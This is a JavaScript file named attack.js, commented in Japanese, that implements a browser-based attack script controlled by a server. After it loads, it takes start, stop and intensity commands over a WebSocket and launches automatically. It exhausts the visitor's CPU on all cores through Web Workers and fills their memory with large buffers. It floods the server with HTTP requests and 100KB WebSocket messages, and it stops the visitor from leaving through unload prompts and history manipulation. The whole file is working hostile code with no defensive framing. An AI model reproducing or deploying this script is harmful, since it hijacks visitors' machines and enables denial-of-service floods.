// attack.js - WebSocket
(function() {
    'use strict';

    // ============================================
    // WebSocketでサーバーと持続的接続
    // ============================================
    let socket = null;
    let reconnectAttempts = 0;

    function connectWebSocket() {
        try {
            const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
            socket = new WebSocket(protocol + location.host + '/ws');
            
            socket.onopen = () => {
                console.log('接続確立');
                reconnectAttempts = 0;
                
                // 接続が切れないように定期的にping
                setInterval(() => {
                    if (socket.readyState === WebSocket.OPEN) {
                        socket.send(JSON.stringify({
                            type: 'ping',
                            timestamp: Date.now()
                        }));
                    }
                }, 1000);
            };
            
            socket.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    
                    switch(data.command) {
                        case 'attack':
                            // サーバーからの指示で攻撃開始
                            startAttack(data.intensity || 1);
                            break;
                        case 'stop':
                            // 攻撃停止
                            stopAttack();
                            break;
                        case 'update':
                            // 設定更新
                            updateConfig(data.config);
                            break;
                    }
                } catch(err) {}
            };
            
            socket.onclose = () => {
                // 切断されたら再接続
                reconnectAttempts++;
                const delay = Math.min(reconnectAttempts * 1000, 30000);
                setTimeout(connectWebSocket, delay);
            };
            
            socket.onerror = () => {
                socket.close();
            };
        } catch(e) {}
    }

    // ============================================
    // 攻撃エンジン
    // ============================================
    let attackInterval = null;
    let isAttacking = false;
    let intensity = 1;

    function startAttack(level) {
        intensity = level;
        isAttacking = true;
        
        // すでに動いてたら止める
        if (attackInterval) {
            clearInterval(attackInterval);
        }
        
        // 攻撃開始
        cpuAttack();
        memoryAttack();
        networkAttack();
        
        attackInterval = setInterval(() => {
            if (isAttacking) {
                // 継続的に負荷をかける
                let x = 0;
                for (let i = 0; i < 1000000 * intensity; i++) {
                    x += Math.random() * Math.random();
                }
            }
        }, 0);
    }

    function stopAttack() {
        isAttacking = false;
        if (attackInterval) {
            clearInterval(attackInterval);
        }
    }

    function updateConfig(config) {
        intensity = config.intensity || intensity;
    }

    // ============================================
    // CPU攻撃（Web Workers + WebSocket連携）
    // ============================================
    function cpuAttack() {
        const cores = navigator.hardwareConcurrency || 4;
        const workerCode = `
            let running = true;
            
            self.onmessage = (e) => {
                if (e.data === 'stop') {
                    running = false;
                }
                if (e.data === 'start') {
                    running = true;
                    attack();
                }
            };
            
            function attack() {
                if (!running) return;
                
                let x = 0;
                const startTime = Date.now();
                
                // 1秒間全力で計算
                while (Date.now() - startTime < 1000) {
                    x += Math.sqrt(Math.random() * 1000) * Math.random();
                }
                
                // 結果をサーバーに報告
                self.postMessage({
                    type: 'result',
                    value: x,
                    timestamp: Date.now()
                });
                
                // 継続
                setTimeout(attack, 0);
            }
            
            attack();
        `;
        
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        
        for (let i = 0; i < cores; i++) {
            const worker = new Worker(url);
            
            worker.onmessage = (e) => {
                // 計算結果をサーバーに送信
                if (socket && socket.readyState === WebSocket.OPEN) {
                    socket.send(JSON.stringify({
                        type: 'worker_result',
                        data: e.data
                    }));
                }
            };
        }
    }

    // ============================================
    // メモリ攻撃
    // ============================================
    function memoryAttack() {
        const memArrays = [];
        
        setInterval(() => {
            if (!isAttacking) return;
            
            try {
                for (let i = 0; i < 10 * intensity; i++) {
                    const buffer = new ArrayBuffer(1024 * 1024 * 5);
                    const view = new Uint8Array(buffer);
                    
                    // 実際にメモリに書き込む
                    for (let j = 0; j < view.length; j += 500) {
                        view[j] = Math.random() * 255;
                    }
                    
                    memArrays.push(buffer);
                }
                
                if (memArrays.length > 100) {
                    memArrays.splice(0, 20);
                }
            } catch(e) {
                memArrays.length = 0;
            }
        }, 50);
    }

    // ============================================
    // ネットワーク攻撃（Socket使って大量リクエスト）
    // ============================================
    function networkAttack() {
        setInterval(() => {
            if (!isAttacking) return;
            
            // 通常のHTTPリクエスト
            for (let i = 0; i < 10 * intensity; i++) {
                fetch(location.href.split('?')[0] + '?attack=' + Math.random(), {
                    mode: 'no-cors',
                    cache: 'no-store'
                }).catch(() => {});
            }
            
            // WebSocket経由でサーバーに負荷をかける
            if (socket && socket.readyState === WebSocket.OPEN) {
                const largeData = 'x'.repeat(1024 * 100); // 100KB
                for (let i = 0; i < 5 * intensity; i++) {
                    socket.send(JSON.stringify({
                        type: 'flood',
                        data: largeData,
                        timestamp: Date.now()
                    }));
                }
            }
        }, 100);
    }

    // ============================================
    // 離脱防止
    // ============================================
    function preventLeave() {
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });
        
        setInterval(() => {
            history.pushState(null, '', location.href.split('?')[0] + '?block=' + Math.random());
        }, 1000);
    }

    // ============================================
    // 初期化
    // ============================================
    function init() {
        connectWebSocket();
        preventLeave();
        
        // 接続確立後に自動で攻撃開始
        const checkConnection = setInterval(() => {
            if (socket && socket.readyState === WebSocket.OPEN) {
                startAttack(1);
                clearInterval(checkConnection);
            }
        }, 500);
    }

    init();
})();
